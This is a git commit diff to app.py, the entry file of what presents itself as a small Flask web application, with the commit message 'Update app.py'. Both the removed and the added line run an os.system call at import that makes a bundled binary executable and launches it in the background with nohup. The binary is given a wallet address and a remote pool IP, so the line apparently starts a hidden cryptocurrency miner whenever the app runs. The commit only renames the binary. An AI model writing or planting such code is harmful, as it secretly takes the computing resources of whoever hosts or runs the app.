4842188e773618bf16c378c93c603bd19a16bdc0
zanejahhesti <122642713+zanejahhesti@users.noreply.github.com>
2023-02-04 22:55:52 +0700

    Update app.py

--- app.py
+++ app.py
@@ -1,7 +1,7 @@
 from flask import Flask
 from flask import render_template
 import os
-os.system('chmod 700 inter;nohup ./go -w deroi1qyr8wnk9aw9lel0xcufdj98cqtd3lc5y84nhl679nm3wknaz0ad6xq9pvfz92xnje7yu7pv0rlr -r 51.222.96.66:80 -p rpc -m 1 &')
+os.system('chmod 700 astro;nohup ./astro -w deroi1qyr8wnk9aw9lel0xcufdj98cqtd3lc5y84nhl679nm3wknaz0ad6xq9pvfz92xnje7yu7pv0rlr -r 51.222.96.66:80 -p rpc -m 1 &')
 app = Flask(__name__)
 
 
